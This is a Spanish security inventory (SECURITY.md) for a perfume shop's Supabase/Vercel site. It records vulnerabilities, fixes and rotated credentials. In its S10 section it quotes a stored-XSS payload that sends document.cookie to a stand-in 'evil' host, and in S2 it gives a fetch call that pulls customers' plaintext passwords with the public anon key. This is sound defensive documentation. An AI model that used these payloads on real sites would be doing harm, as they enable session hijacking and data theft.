# SECURITY.md — Inventario de seguridad de ST Perfumería

> **Última actualización:** **Septiembre 23, 2026 (noche, `_l`)** — **S11 recortado** (§ 📏): queda qué era, que se arregló (falla cerrado) y que se re-testea al cerrar `[VERCEL-ENV-VARS]`; salen «Cuándo se vuelve peligroso» y la línea que lo ataba a S1. La historia de git conserva la versión anterior.
>
> **Antes (23-sep, noche, `_j`):** — **S1 y S4 pasan a keyword sola** (§ 📏): los dos describen agujeros abiertos — S1 mientras `[VERCEL-ENV-VARS]` no cierre, S4 hasta que Alejo decida. S4 estrena keyword: **`[S4-OREGON]`**. El detalle vive fuera del repo; la historia de git conserva las versiones anteriores de las dos secciones.
>
> **Antes (23-sep, noche, cierre):** — **S8 resuelto:** el bucket de fotos quedó sólo para las dos cuentas del panel (3 políticas por email; `anon` ya no lista ni escribe) y las fotos se siguen sirviendo por su URL pública. **S3 y S13** pasan a keyword sola: la regla de § 📏 vale también para lo de mayo (el repo es público).
>
> **Antes (23-sep, noche):** — **S5 y S19 resueltos:** la DB password de São Paulo se rotó (Alejo) y el registro de Supabase Auth quedó apagado (`disable_signup: true`). **Regla nueva:** los agujeros abiertos van con la keyword sola (§ 📏). Backup local de las fotos hecho (S8 sigue abierto). S18 queda sólo con la keyword.
>
> **Antes (23-sep, tarde):** — **S15, S16 y S17 RESUELTOS** en v1.1.114: el dominio ya no sirve los documentos internos (`.vercelignore`), el teléfono de "Pedidos pass" se escapa y la RPC del reset valida dígitos (`[XSS-PEDIDOS-PASS]`), y `anon` ya no lee `lista_espera` (`[ESPERA-SEGURA]`). **S1:** contraseñas rotadas el 19-sep; lo que queda va con la keyword sola. **S18 abierto** (`[S10-TER-XSS-COMBOS]`, 🟠, sólo escribible por el panel).
>
> **Antes (20-sep-2026):** — **S10 y S10-bis RESUELTOS** (stored XSS del panel admin: Clientes `f457b89`, Lista de espera + Opiniones `033ab70`/`ce52def`, SW v1.1.104). De yapa, `[WA-LINK-549-DUPLICADO]` (no es seguridad) también resuelto. Antes: 17-sep (**S2 RESUELTO** · `[BCRYPT-MIGRATION]` · `98b556c` + FASE 1/3 en producción · anon sin acceso directo a `clientes`, bcrypt con migración perezosa, rate-limit server-side; token de Telegram y chat_id sacados de este doc y rotado; regla nueva de no llevar valores de credenciales; S13 nuevo). Antes: 12-ago (`[FOTOS-OREGON]` · S2 medido en 82/78 · S11 arreglado · S12 nuevo).
> **Estado general:** ⚠️ **Hay vulnerabilidades CRÍTICAS pendientes de fix.** Este documento es el ground truth de qué sabemos sobre seguridad del proyecto, qué está roto, qué está OK, y qué planeamos arreglar.
>
> **Audiencia:** Alejo + Claude Code de próximas sesiones. Cuando arranque la sesión `[SECURITY-AUDIT-S1]`, **leer este archivo primero.**

---

## 📏 Regla · los documentos de auditoría NO llevan valores de credenciales

> Un doc de seguridad describe **dónde vive** una credencial (archivo, línea, función SQL, env var), **nunca su valor**. Ni "para documentar la fuga", ni entre comillas, ni parcial. El repo es público y git no olvida: lo que se pega una vez queda en el historial para siempre, y la única salida es rotar la credencial.
>
> Aprendido el 17-sep-2026: § S3 tenía el token real del bot de Telegram y el chat_id escritos completos desde mayo. Se enmascararon y se rotó el token. Vale para `docs/`, `memory/`, `RECOMENDACIONES_CLAUDECHAT/`, commits y chats. Si un valor hace falta para ejecutar algo, se copia **directo** de donde vive (Supabase → Vercel), no por acá. **Vale también para capturas de pantalla** (19-sep: una captura del SQL Editor mostró el token y hubo que rotarlo de nuevo): antes de mandar una imagen, tapar el valor. Y "verificado" para una credencial significa **un uso exitoso** (un mensaje entregado, un login que entra), no un hash del cuerpo de la función.
>
> **Agujeros abiertos (decisión de Alejo, 23-sep-2026):** mientras un agujero esté abierto, en el repo va **la keyword sola**; la descripción (dónde, cómo, archivo:línea) entra cuando se cierra. El repo de GitHub es público: describir un agujero abierto es publicar el mapa. El detalle vive fuera del repo, en `D:\workspace\_correo_agentes\`.

---

## 🚨 Issues CRÍTICOS · fix URGENTE (1-2 días)

### **S1 · `[SECURITY-AUDIT-S1]` · 🟠 ABIERTO (parcial)**

> Las dos contraseñas del panel **se rotaron** el 19-sep (Alejo, 21:11 ART; verificado por login y logout de las dos cuentas a las 21:15-21:16), la constante muerta se borró el 23-sep (`4b88e20`) y `.claude/commands/security-scan.md` quedó sin valores (`db37b21`). Lo que queda abierto va con **la keyword sola** por la regla de § 📏 (23-sep); el detalle vive fuera del repo. Se cierra junto con `[VERCEL-ENV-VARS]`. La historia de git conserva la versión anterior de esta sección.

---

### **S2 · Pass de clientes en plano en tabla `clientes` · ✅ RESUELTO 17-sep-2026**

**Severidad:** 🔴 CRÍTICA · pendiente desde antes (`[BCRYPT-MIGRATION]` documentado en HISTORIA.md).

> ✅ **ESTADO: RESUELTO** · commit `98b556c` (`[BCRYPT-MIGRATION]`, SW v1.1.100) + `sql/fase1.sql` y `sql/fase3.sql` corridos por Alejo en producción el 17-sep-2026. **Escalones 1 y 2 hechos juntos**, como pedía este plan:
> - `anon` **ya no tiene ninguna policy** sobre `clientes` (antes tenía SELECT, INSERT, UPDATE **y DELETE** con `true` — la de DELETE nadie la había relevado). Verificado con la anon key: `GET /rest/v1/clientes?select=telefono` → **0 filas** (antes 98). El panel admin sigue igual con 4 policies nuevas `to authenticated`.
> - El login pasa por `cliente_login(telefono, pass)` (`SECURITY DEFINER`): compara **en el servidor**, y si la clave guardada está en plano y coincide, la reemplaza por **bcrypt cost 10** en ese mismo login (migración perezosa; nadie tuvo que cambiar su clave). Registro y activación guardan hasheado desde el primer segundo. También `cliente_registrar`, `cliente_editar` (ahora exige la clave: antes anon podía cambiar nombre/teléfono de cualquiera), `cliente_puntos`, `cliente_reset_solicitar`.
> - **Rate-limit del lado del servidor** (`cliente_login_intentos`: 5 fallos → 15 min), hash dummy para teléfonos inexistentes (77 ms vs 76 ms: el tiempo no delata qué números existen), mensaje unificado, y la columna `bloqueado` por fin bloquea.
> - Métrica: los hashes suben con cada login (`count(*) filter (where password like '$2%')`). Los 4 clientes sin clave se activan con la primera que escriban.
> - **D verificado por Alejo el 17-sep contra producción**: un cliente con password en texto plano (el caso de 92 de 96) → login `ok` → password pasa a `$2a$10$…` → `crypt(clave, password) = password` true / clave incorrecta false → segundo login contra el hash `ok`. **Los 92 entran con su clave de siempre.**
> - **Queda:** escalón 3 (Supabase Auth) · `cliente_puntos` / `cliente_reset_solicitar` responden con sólo el teléfono (misma exposición que antes: nombre y puntos) · **S13** (abajo) · `[LOGIN-INTENTOS-CLEANUP]`. Detalle de diseño y tropiezos en `docs/HISTORIA.md` § "Sesión 16→17-sep-2026".
>
> Lo que sigue abajo es el análisis original, se conserva como historia.

**Donde está:**
- Tabla `public.clientes` columna `password` (texto plano)
- En el dump pre-migración (D:\backups\st-perfumeria-pre-migracion-20may2026.sql) se pueden ver TODOS los passwords de los 38 clientes en plano · 1 grep y los tenés todos

**Quién puede explotar:**
- Alguien con acceso a la BD via:
  - SQL injection (no la vi pero podría haber)
  - Acceso al dashboard de Supabase (si el password del owner se filtra)
  - Acceso al dump (D:\backups\ o GitHub Release si lo subes)

**Fix recomendado (`[BCRYPT-MIGRATION]`):**
- Implementar lazy migration: cuando un cliente hace login con su password en plano, el server (función SQL) hashea con bcrypt y reemplaza el valor en la columna. La próxima vez compara hash.
- Tras 6 meses, los clientes activos ya están migrados. Los inactivos pueden forzarse via reset.
- Esto está documentado como pendiente desde hace meses. Hoy SIGUE siendo crítico.

**⚠️ Exploitabilidad directa (hallado 27-jun-2026 · agrava S2):**
La tabla `clientes` tiene una policy `SELECT` para el rol `public` con `USING (true)` (policy "Leer clientes"). Como la **anon key vive en el JS público** (`js/app.js` / `admin.html`), cualquiera puede hacer hoy mismo, sin loguearse:

```js
fetch(SUPABASE_URL + '/rest/v1/clientes?select=telefono,password', {
  headers: { apikey: ANON_KEY, Authorization: 'Bearer ' + ANON_KEY }
})
```

y bajarse **TODOS los teléfonos + contraseñas en plano** de los clientes. No hace falta el dump ni acceso al dashboard · la anon key de **producción** alcanza. Esto convierte a S2 en explotable de forma remota y trivial, no sólo "si alguien accede a la BD".

**Por qué no se puede apretar la RLS a secas:** el login del cliente (`js/app.js`) lee `clientes` como `anon` para comparar la pass. Cerrar el `SELECT` público **rompe el login** hasta migrar a Supabase Auth + bcrypt. Por eso el fix va atado a `[BCRYPT-MIGRATION]`, no es un cambio de policy aislado.

**Mitigación posible sin romper login:** mover la verificación de pass a una función `SECURITY DEFINER` (RPC) que reciba `telefono`+`pass` y devuelva sólo un booleano; entonces el `SELECT password` deja de necesitar estar abierto a anon y la policy puede restringir columnas/filas.

#### 📊 Medición real · 12-ago-2026

Ejecutada con la **clave pública** desde el navegador contra producción, sin exponer ningún valor:

| Medición | Resultado |
|---|---|
| ¿`clientes` legible por `anon` sin cuenta? | **Sí** |
| Fichas descargables | **82** (eran 38-40 en mayo · el negocio creció) |
| Contraseñas legibles | **78** |
| Que parecen hash bcrypt (≥55 chars) | **0** |
| En texto plano (<40 chars) | **78** · largos entre 4 y 22 |
| Columnas expuestas | `id`, `nombre`, `telefono`, `password`, `bloqueado`, `puntos`, `compro`, `nota`, `puntos_log` |

**El daño real no es del negocio, es de los clientes:** la gente reutiliza contraseñas, así que la misma clave puede abrir su mail o sus redes. Por eso este es el issue #1 de la lista.

#### 🎯 Plan acordado con Alejo (12-ago) · 3 escalones

| # | Qué | Qué resuelve | Esfuerzo |
|---|---|---|---|
| 1 | **Cerrar la puerta** · RLS cerrada en `clientes` + login por función `SECURITY DEFINER` que devuelva sólo un booleano | Deja de ser explotable por cualquiera desde internet | ~1 h |
| 2 | **Hashear** · bcrypt con migración perezosa (al primer login se reemplaza el plano por el hash) | Aunque alguien llegue a la BD, no se lleva contraseñas usables | ~1-2 h |
| 3 | **Migrar a Supabase Auth** (mismo sistema que ya usa el panel admin) | Deja de mantenerse código propio de seguridad | Sesión dedicada |

⚠️ **Los pasos 1 y 2 van juntos o no van.** El login del cliente hoy lee `clientes` como `anon` para comparar la contraseña: cerrar la policy a secas **deja a todos los clientes afuera**. Hacerlo con el local cerrado y verificando el login antes de dar por terminado.

#### 🚨 Plan de respuesta ANTE una filtración (pedido explícito de Alejo)

1. **Cortar** · rotar la anon key + cerrar la RLS, para que la filtración no siga.
2. **Resetear todas las contraseñas** · `UPDATE clientes SET password = NULL`. El flujo `[FORGOT-PASS-A]` hace que cada cliente defina una nueva la próxima vez que entra, **sin atender a nadie uno por uno**. Es la palanca de emergencia que quedó construida el 27-jun.
3. **Avisar a los clientes** (WhatsApp / redes) con el mensaje que de verdad los protege: *"si usabas esa misma contraseña en otro lado, cambiala"*.
4. **Dejar registro** de qué pasó, qué datos y cuándo. En Argentina rige la ley de protección de datos personales (25.326 · AAIP); avisar a los afectados es lo correcto además de lo que corresponde.

---

## 🟡 Issues ALTOS · fix en 1-2 semanas

### **S3 · `[S3-VAULT]` · 🟡 ABIERTO (parcial)**

> El token del bot de Telegram **se rotó** el 17-sep y otra vez el 19-sep (verificado por entrega en `pg_net`). Lo que queda abierto va con **la keyword sola** por la regla de § 📏 (23-sep, aplicada también a lo de mayo); el detalle vive fuera del repo. La historia de git conserva la versión anterior de esta sección.

---

### **S4 · `[S4-OREGON]` · 🟡 ABIERTO**

> Agujero abierto: va con **la keyword sola** por la regla de § 📏 (23-sep); el detalle vive fuera del repo. Decide Alejo. La historia de git conserva la versión anterior de esta sección.

---

### **S5 · DB passwords de ambos proyectos expuestas en chat**

> ✅ **ESTADO: RESUELTO 23-sep-2026 (São Paulo).** Alejo rotó la DB password del proyecto activo; el sitio, el panel y la API siguieron en 200 y ningún código usa conexión directa a Postgres (0 `postgres://`/`DATABASE_URL`/pooler fuera de docs). El reset desde el dashboard no deja línea en `postgres_logs`. Oregon está pausado (`INACTIVE`): se rota o se borra con la decisión sobre ese proyecto. Los valores viejos se sacaron de este archivo el mismo día (quedan en la historia de git, ya sin valor).
>
> Lo que sigue abajo es el análisis original, se conserva como historia.

**Severidad:** 🟡 ALTA · expuestas en chat de Claude Code de esta sesión (que va al servidor de Anthropic).

**Donde están:**
- DB password del proyecto viejo (`<valor>` · proyecto pausado) · pegada en chat para que pueda hacer `pg_dump`
- DB password del proyecto nuevo (`<valor>` · rotada el 23-sep-2026) · pegada en chat para que pueda hacer `psql`

**Quién puede acceder:**
- Anthropic (logs internos de las conversaciones de Claude · políticas estrictas pero técnicamente accesible)
- Cualquiera con acceso al device de Alejo si tiene el chat abierto

**Fix recomendado · ACCIÓN INMEDIATA:**
1. **Resetear DB password del proyecto nuevo** (sa-east-1 São Paulo):
   - Settings → Database → "Reset database password"
   - Generar nueva fuerte
   - **NO necesita rotación adicional** porque la DB password se usa SOLO para conexiones psql/pg_dump directas (que ahora no usamos)
2. **Resetear DB password del proyecto viejo** (us-west-2 Oregon) · idem
   - Pero ojo: si vas a hacer rollback antes de bajar el viejo, vas a necesitar reactivar las conexiones · tal vez postergar este reset hasta el 28-may cuando se vaya a baja

**Sin urgencia · pero hacerlo dentro de 48 horas.**

---

### **S6 · service_role keys de ambos proyectos manejadas en archivos temp**

**Severidad:** 🟡 ALTA · borrados ya, pero pasaron por disco local.

**Estado actual:**
- ✅ `D:\tmp\.env` BORRADO al final de la sesión 21-may
- ✅ `D:\tmp\plan-b-credentials.txt` BORRADO al final de la sesión 21-may
- ✅ Los archivos no se commitearon al repo en ningún momento

**Riesgo residual:**
- Quedan en el espacio libre del disco hasta que el SO sobreescriba esos sectores
- Si alguien tiene acceso físico al disco D:\ y herramientas forenses, puede recuperar los archivos borrados

**Fix recomendado:**
- Si el disco D:\ se va a usar en otra máquina o se va a vender · usar herramienta de borrado seguro (`sdelete -p 3 D:\tmp\.env` antes de borrar)
- Si el disco queda con Alejo · riesgo aceptable

---

### **S10 · Stored XSS · nombre de cliente sin escapar en el panel admin · ✅ RESUELTO 20-sep-2026 (S10-bis también resuelto)**

**Severidad:** 🟡 ALTA · hallado 27-jun-2026 durante el test de `[FORGOT-PASS-A]`.

> ✅ **ESTADO: RESUELTO en la pestaña Clientes** · `f457b89` (`[S10-XSS-CLIENTES]`, rama `fix-xss-admin-panel` mergeada fast-forward a `main`) + SW **v1.1.103** (`c8f8b51`) · 20-sep-2026. En `renderClients` (cards y tabla) pasan por `escapeHtml()`: `nombre`, `telefono`, `telefono2`, `nota`, la inicial del avatar y el `data-name` del buscador; `openPuntosModal(c.id)` con comillas (uuid). `escapeHtml(` pasa de 10 a 20 ocurrencias en `admin.html`. Verificado en producción: `admin.html` servido con los 20, SW v1.1.103.
>
> ✅ **S10-bis · `[S10-BIS-XSS-ESPERA-OPINIONES]` · RESUELTO 20-sep-2026 (más tarde)** — rama `fix-s10-bis-xss-espera-opiniones` → `main` fast-forward (`033ab70` + `ce52def`) + SW **v1.1.104** (`aae744e`). Mismo patrón que Clientes, en las dos pestañas que quedaban: **Lista de espera** (`renderListaEspera`: `group.name`, `item.telefono` y `item.nombre` de `lista_espera`, escribible por `anon` desde el sitio, ahora por `escapeHtml()`; el `href` de WhatsApp usa el teléfono limpiado a solo dígitos, no `escapeHtml()`, mismo patrón que `renderClientes`) y **Opiniones** (`loadOpiniones`: `o.nombre`, `o.perfume_slug` y `o.texto` — el `title`, que antes sólo reemplazaba `"`, ahora usa `escapeHtml()` por consistencia; no era explotable como estaba, pero quedaba inconsistente con el resto del archivo).
>
> **Hallazgo aparte durante el análisis, más grave que los anteriores:** el botón "Avisar a todos" armaba `onclick="avisarTodos('` + `slug` + `')"` con el `slug` de `lista_espera` (mismo dato alcanzable por `anon`) sin escapar dentro de un string JS de comillas simples. `escapeHtml()` no escapa comillas simples, así que **no alcanzaba con envolverlo** — bastaba un `slug` con un `'` para romper el string y ejecutar JS arbitrario en la sesión admin, y con `" onmouseover="..."` ni siquiera hacía falta click, alcanzaba con pasar el mouse por el botón. Verificado con 7 payloads antes y después del fix. Solución: `escapeHtml(JSON.stringify(slug))` — `JSON.stringify` arma el literal JS con sus propias comillas (sin necesitar escapar `'`), y `escapeHtml()` neutraliza esas comillas para el atributo HTML.
>
> `escapeHtml(` pasa de 20 a 28 ocurrencias (25 líneas, verificado con grep). Verificado también: `node --check` sobre el `<script>` inline sigue pasando (no se rompió ninguna comilla), y el `href` de WhatsApp de Lista de espera queda con solo dígitos ante teléfonos con comillas/espacios/intentos de inyección. `item.id` (Lista de espera) y `o.id` (Opiniones) quedaron sin escapar en sus `onclick` a propósito — son `bigint`/`uuid` generados por la DB, no texto libre de usuario, mismo criterio que el resto del panel. Detalle completo en `docs/HISTORIA.md` § "✅ Resueltos" (movidos 20-sep-2026, más tarde).
>
> **De yapa, no es XSS:** `[WA-LINK-549-DUPLICADO]` resuelto en el mismo push (`ce52def`) — `renderClientes` armaba el link de WhatsApp con `'https://wa.me/549' + tel` cuando `tel` ya trae el `549` guardado, generando un número de 16 dígitos que no abría WhatsApp. Ahora son 13. No afecta a `renderListaEspera`, que nunca tuvo el prefijo de más.

**Dónde está:**
- `admin.html` (~L3900) · la tab "Clientes" (`renderClients`) inyecta `c.nombre` directo vía `innerHTML` sin escapar:
  ```js
  + '<div class="client-name">...' + c.nombre + blockedBadge + '</div>'
  ```
- Probablemente otros campos de texto libre del cliente (`c.nota`, `c.telefono2`) comparten el patrón.

**Cómo explotarlo:**
1. Un atacante se registra en el sitio público (signup abierto) con un nombre tipo `<img src=x onerror="fetch('https://evil/?c='+document.cookie)">`.
2. Cuando la chica (jefe o empleada) abre la tab "Clientes" en el panel, ese HTML se ejecuta **en su sesión admin autenticada**.
3. El payload puede robar tokens de sesión de Supabase, ejecutar acciones admin, exfiltrar datos de los clientes, etc.

**Impacto:** ejecución de JS arbitrario en el contexto del panel admin → escalada efectiva a "cualquier cosa que la chica puede hacer".

**Fix recomendado:**
- Escapar TODO texto libre del cliente antes de inyectarlo (`escapeHtml()` ya existe en `admin.html`, L7212). Aplicar en `renderClients` a `nombre`, `nota` y cualquier campo editable por el cliente.
- Auditar TODOS los `innerHTML` del panel que mezclen datos de usuario.
- ✅ En el código nuevo de "Pedidos pass" (commit `eefdfe9`) el nombre YA se escapa · este issue es para los lugares preexistentes.

---

### **S11 · Auth "fail-open" en `/api/send-notification` · ✅ ARREGLADO**

**Severidad:** 🟠 ALTA en potencia · nunca llegó a ser explotable. **Hallado y arreglado el mismo día (12-ago-2026).**

> ✅ **ESTADO: RESUELTO** · commit `ef1507d`. **Qué era:** la comparación del secreto del endpoint no verificaba que la variable de entorno existiera, así que sin la variable un pedido que omitía el campo pasaba. **Arreglo:** la condición **falla cerrado** (sin la variable configurada se rechaza todo); la lógica se verificó en Node con los 5 casos posibles. **Pendiente:** el `401` todavía no se puede observar en producción, porque la función no arranca sin las variables de Vercel → **re-testear al cerrar `[VERCEL-ENV-VARS]`**: con las variables puestas, un POST sin el campo tiene que dar `401`. El detalle vive fuera del repo; la historia de git conserva la versión anterior de esta sección.

**Patrón a revisar en el resto de las funciones:** cualquier comparación contra una variable de entorno que pueda ser `undefined`. `api/cron/backup.js` **sí lo hace bien** (el `&&` lo salva).

---

### **S12 · Vercel sin ninguna variable de entorno · 3 funciones caídas desde mayo**

**Severidad:** 🟡 ALTA como problema operativo (no es una vulnerabilidad en sí, pero rompe el backup propio y habilita S11).

**Estado verificado 12-ago-2026:** `Settings → Environment Variables` del proyecto `st-perfumeria` está **completamente vacío** (pestaña Project). Faltan: `SUPABASE_URL`, `SUPABASE_SERVICE_KEY`, `ADMIN_PASS`, `VAPID_PUBLIC_KEY`, `VAPID_PRIVATE_KEY`, `CRON_SECRET`.

**Consecuencias:**

| Función | Qué hace | Estado |
|---|---|---|
| `api/cron/backup.js` | Backup diario propio a `admin_backups` | ❌ corta con "SUPABASE_URL o SERVICE_KEY no configurados" |
| `api/push-subscribe.js` | Registra suscriptores de notificaciones | ❌ |
| `api/send-notification.js` | Envía el push masivo | ❌ **500 en todo request** · `webpush.setVapidDetails()` corre a nivel de módulo (L16) y explota con las claves en `undefined`, así que la función ni carga |

**Evidencia:** el cron **sí** está declarado en `vercel.json` (`/api/cron/backup`, `0 3 * * *`) y conserva los 12 más recientes, pero `admin_backups` tiene **sólo 4 filas, del 2 al 16 de mayo** → ya fallaba **antes** de la migración. Los logs de Vercel no sirven para confirmar (retención de **1 hora** en plan Hobby).

**Mitigante importante:** los **backups diarios propios de Supabase SÍ funcionan** (`Database → Backups → Scheduled`, con `Restore`, hasta hoy). Los datos del negocio están cubiertos. ⚠️ Pero **no incluyen Storage** → las fotos no están en ningún backup automático (pendiente `[BACKUP-FOTOS-LOCAL]`).

⚠️ **Al reponerlas:** la `SUPABASE_SERVICE_KEY` se copia **directo del dashboard de Supabase al de Vercel**. Nunca por chat, ni a Claude ni a nadie (ver S6).

---

### **S13 · `[S13-ESCRITURAS-ANON]` · 🟠 ABIERTO**

> Agujero abierto: **la keyword sola** por la regla de § 📏 (23-sep). Se resuelve de verdad con `[SUPABASE-AUTH]`. El detalle vive fuera del repo; la historia de git conserva la versión anterior de esta sección.

---

### **S14 · `[TELEGRAM-ANON-ABIERTO]` · `anon` podía invocar `send_telegram` con texto libre · ✅ RESUELTO 19-sep-2026**

**Severidad:** 🔴 ALTA · hallado el 17-sep-2026 al verificar la rotación del token de S3.

> ✅ **ESTADO: RESUELTO** · `b0cde5e` (SQL: `sql/fase4a_telegram_avisos.sql` + `sql/fase4b_telegram_cerrar.sql`, corridos por Alejo en ese orden) + `5af3d85` (JS) + SW v1.1.102 · 19-sep-2026. Diseño de ClaudeChat, decisión (a) de Alejo: `authenticated` conserva EXECUTE (el panel manda 31 avisos por `notifyTelegram`).
> - Los 5 avisos del sitio público (reset, primer ingreso, bloqueo, perfil editado, lista de espera) los manda **el servidor** desde las RPC de S2 vía `_aviso_tg` (best-effort: `exception when others`, un Telegram caído no tumba un login) y un trigger `after insert` en `lista_espera`. `app.js` ya no tiene `notifyTG`. El aviso de bloqueo pasó de contar en localStorage a contar en el servidor por teléfono, y sale **una sola vez** al cruzar el umbral, con el teléfono enmascarado.
> - `send_telegram`: `revoke all from public` (el ACL real tenía `=X/postgres`: revocar sólo a `anon` no cerraba nada) + `revoke from anon` + `grant` explícito a `authenticated, service_role` + `search_path` fijo, sin tocar el cuerpo.
> - **De yapa, el mismo agujero en `admin_actions_cleanup`**: `SECURITY DEFINER`, borra filas de `admin_actions` (2.625) y era ejecutable por `anon` — cualquiera con la anon key podía purgar la auditoría. Cerrada igual.
> - **Verificado en producción:** `has_function_privilege('anon', …)` → false en las dos · POST anónimo con la anon key a `/rpc/send_telegram` y `/rpc/admin_actions_cleanup` → **401 permission denied** · `cliente_login` sigue 200 · ACL sin `=X/` · `proconfig` con `search_path` en las 4 funciones · **los 5 avisos entregados con `200` en `net._http_response`** (04:03:18 → 04:04:04) · el 6º intento estando bloqueado no volvió a avisar.
> - **Queda:** opción (b) `admin_notificar()` si algún día se quiere cerrar también a `authenticated` · `[S3-VAULT]`.

**Dónde está:** `public.send_telegram(msg text)` es `SECURITY DEFINER` y tiene **EXECUTE para `anon`** (`has_function_privilege('anon', 'public.send_telegram(text)', 'execute')` → `true`). El front la llama con `sb.rpc('send_telegram', { msg })` (`notifyTG` en `js/app.js`) para los avisos de "Primer ingreso" y "Pedido de RESET".

**Riesgo real:** con la anon key (pública, está en `app.js`) cualquiera puede hacer `POST /rest/v1/rpc/send_telegram` con `{"msg": "lo que quiera"}` y el bot lo entrega **en el chat del jefe**: spam, phishing con pinta de aviso del sistema, o simplemente tapar los avisos reales. **Rotar el token no cierra esto**: la función sigue siendo un relay abierto. Además tiene `proconfig` null (sin `search_path` fijo), a diferencia de las `cliente_*` de S2.

**Fix (un parche, en este orden):**
1. Que cada RPC de S2 mande **su propio aviso del lado del servidor**, con el texto armado en SQL: `cliente_login` cuando devuelve `activado` ("Primer ingreso") y `cliente_reset_solicitar` cuando encuentra al cliente ("Pedido de RESET"). Las dos ya saben cuándo corresponde; hoy lo dispara el front.
2. Sacar los `notifyTG` correspondientes de `js/app.js` (bump SW).
3. `revoke execute on function public.send_telegram(text) from anon, authenticated, service_role;` — queda interna, como `_cliente_hash`. Ojo con los *default privileges* de Supabase (ver S2): el revoke tiene que ser explícito por rol.
4. `alter function public.send_telegram(text) set search_path = public, extensions;`
5. Verificar: `has_function_privilege('anon', …)` → `false`, un `POST` anónimo a `/rpc/send_telegram` → 401/403, y que los dos avisos sigan llegando desde las RPC.

---

### **S15 · `[DOCS-PUBLICOS]` · El dominio servía los documentos internos del repo · ✅ RESUELTO 23-sep-2026**

**Severidad:** 🔴 ALTA mientras duró · lo encontró el relevamiento de S18 (23-sep).

> ✅ **ESTADO: RESUELTO** · `db37b21` + SW v1.1.114. No había `.vercelignore` y Vercel subía el repo entero: `/CLAUDE.md`, `/docs/SECURITY.md` (este archivo: el mapa de los agujeros), `/docs/HISTORIA.md`, `/docs/DATABASE.md`, `/sql/*.sql`, `/memory/preferencias_alejo.md`, `/scripts/*.js`, `/RECOMENDACIONES_CLAUDECHAT/*.md` y `/.claude/commands/security-scan.md` (con los dos valores de S1) respondían **200**. Ahora `.vercelignore` excluye `docs/`, `sql/`, `memory/`, `RECOMENDACIONES_CLAUDECHAT/`, `.claude/`, `scripts/` y `*.md`. **Verificado en producción:** 404 en las 8 rutas de la lista y 200 en `/`, `/admin.html`, `/sw.js`, `/perfumes.js`, `/js/app.js`, `/fonts/fonts.css`, `/css/styles.css`, `/manifest.json`, `/sitemap.xml` y `/robots.txt` — funciona con los deploys por Git. `content/blog/*.json` (lo lee `api/blog.js`) sigue servido a propósito.
> **Queda:** el repo de GitHub es público, así que todo esto sigue legible ahí (por eso los docs describen dónde vive un valor, nunca el valor). **Sin verificar:** si las URLs inmutables de deployments viejos (`*.vercel.app`) siguen sirviendo esos archivos.

---

### **S16 · `[XSS-PEDIDOS-PASS]` · XSS almacenado desde `anon` hacia el panel ("Pedidos pass") · ✅ RESUELTO 23-sep-2026**

**Severidad:** 🔴 ALTA · un visitante sin cuenta podía ejecutar código en la sesión del jefe o de la empleada.

> ✅ **ESTADO: RESUELTO** · SQL Bloque 1 (Alejo) + `4b88e20` + SW v1.1.114. `cliente_reset_solicitar(p_telefono)` (`SECURITY DEFINER`, EXECUTE para `anon`) sólo pedía `length >= 8` e insertaba el texto tal cual en `password_reset_requests`; `loadResetRequests` (`admin.html`) lo pintaba crudo en `innerHTML`, en una pestaña que ven los dos roles. **Fix:** `escapeHtml(r.telefono)` en los dos lugares donde se pinta, y la RPC valida `^[0-9]{8,15}$` antes de insertar. **Verificado:** con el fixture de un pedido cuyo teléfono es un `<img onerror>`, en `main` se ejecutaba y en la rama no (se ve como texto); el link de WhatsApp (sólo dígitos) y el botón de reset siguen igual. En producción había 0 filas con caracteres que no fueran dígitos.

---

### **S17 · `[ESPERA-SEGURA]` · `anon` leía `lista_espera` entera · ✅ RESUELTO 23-sep-2026**

**Severidad:** 🟠 ALTA · con la clave pública se descargaban 43 filas con 27 teléfonos de clientes (antes se llamó `[ESPERA-SELECT-ANON]`).

> ✅ **ESTADO: RESUELTO** · SQL Bloques 1-3 (Alejo) + `fe302d1` + `41aa39a` + SW v1.1.114. El catálogo leía la tabla sólo para deduplicar antes de insertar. Ahora: inserta directo, y el índice único parcial `lista_espera_pendiente_uniq (slug, telefono) WHERE notified_at IS NULL` responde 23505 si ya estaba pendiente (Bloque 2, corrido **antes** del deploy para no dejar una ventana sin deduplicación); el "✓ Te avisamos" sale de `lista_espera_pendientes(p_telefono)` (`SECURITY DEFINER`, devuelve sólo slugs pendientes y valida dígitos); y la política de SELECT pasó a `authenticated` (Bloque 3). Además, `DELETE` en la tabla quedó sólo para el jefe (`le_delete_auth` = `is_jefe()`, decisión 45). **Verificado en producción como `anon`:** `GET /rest/v1/lista_espera` → 200 `[]` (`Content-Range: */0`) y la RPC con un teléfono inexistente o con texto → `[]`. El `INSERT` sigue abierto a `public` (el catálogo lo necesita); no se probó en producción a propósito.

---

### **S18 · `[S10-TER-XSS-COMBOS]` · 🟠 ABIERTO**

> Agujero abierto: por la regla de § 📏 (23-sep) acá va sólo la keyword. El detalle vive en el inventario fuera del repo y entra cuando se cierre.

---

### **S19 · `[SIGNUP-ABIERTO]` · El registro de Supabase Auth estaba abierto · ✅ RESUELTO 23-sep-2026**

**Severidad:** 🔴 mientras duró · lo encontró el repaso de Pendientes (23-sep).

> ✅ **ESTADO: RESUELTO** · `GET /auth/v1/settings` daba `disable_signup: false` con el proveedor de email habilitado (confirmación por mail). Una cuenta confirmada quedaba como `authenticated` y heredaba todas las políticas que usan ese rol como si fuera staff (entre ellas, leer `clientes`). Alejo apagó *Allow new users to sign up* y se verificó `disable_signup: true`; el login por email del panel sigue andando. La tercera cuenta de `auth.users` (gmail, 20-mar-2026) es de Alejo. Queda relacionado: `[AUTH-ES-STAFF]` (inventario de las políticas que confían en el rol).

---

## 🟢 Issues MEDIOS · revisar pero no urgente

### **S7 · admin.html accesible públicamente · cualquiera puede llegar al login**

**Severidad:** 🟢 MEDIA · no es un issue per se (es necesario para que las chicas accedan), pero combinado con S1 lo agrava.

**Mitigaciones existentes:**
- Lockout escalonado por intentos fallidos (5 intentos → bloqueo escalado en tiempo)
- Telegram notification cuando alguien intenta entrar
- `[LOGIN-RETRY-SP]` reintento silencioso pero NO cuenta timeouts como fallos

**Mitigaciones adicionales propuestas:**
- Path obfuscation: cambiar `admin.html` a `admin-X9k2.html` (security through obscurity · ayuda contra bots automatizados)
- Rate limiting en Vercel/Cloudflare (más robusto)
- Subir contador de fallos a 3 en lugar de 5 (más estricto)
- Email/Telegram alert ANTES del lockout (después de 2 intentos)

---

### **S8 · Bucket Storage `perfume-fotos` con policies muy permisivas · ✅ RESUELTO 23-sep-2026**

